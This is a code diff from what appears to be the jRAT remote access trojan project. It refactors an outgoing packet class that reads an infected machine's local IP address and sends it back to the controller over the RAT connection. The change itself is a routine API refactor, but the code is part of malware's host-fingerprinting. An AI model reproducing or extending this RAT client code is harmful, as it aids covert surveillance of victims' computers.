@@ -1,15 +1,15 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
-import java.net.InetAddress;
+import jrat.client.Connection;
 import oslib.OperatingSystem;
+
+import java.net.InetAddress;
 
 
 public class Packet12InitLocalAddress extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		String address = "Unknown"; 
 		
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
@@ -19,8 +19,8 @@ public class Packet12InitLocalAddress extends AbstractOutgoingPacket {
 				e.printStackTrace();
 			}
 		}
-		
-		sw.writeLine(address);
+
+        con.writeLine(address);
 	}
 
 	@Override
